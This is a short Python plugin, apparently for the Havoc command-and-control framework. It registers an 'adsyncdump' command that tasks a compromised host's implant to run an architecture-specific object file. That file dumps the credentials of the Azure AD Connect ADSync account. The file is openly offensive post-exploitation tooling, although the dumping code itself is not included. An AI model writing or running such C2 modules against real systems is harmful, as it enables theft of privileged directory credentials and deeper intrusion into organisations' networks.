from havoc import Demon, RegisterCommand

def adsyncdump(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None

    demon  = Demon( demonID )

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to dump ADSync credentials" )
    
    demon.InlineExecute( TaskID, "go", f"adsyncdump.{demon.ProcessArch}.o", b'', False )

    return TaskID

RegisterCommand( adsyncdump, "", "adsyncdump", "Dump credentials of the ADSync account", 0, "", "" )
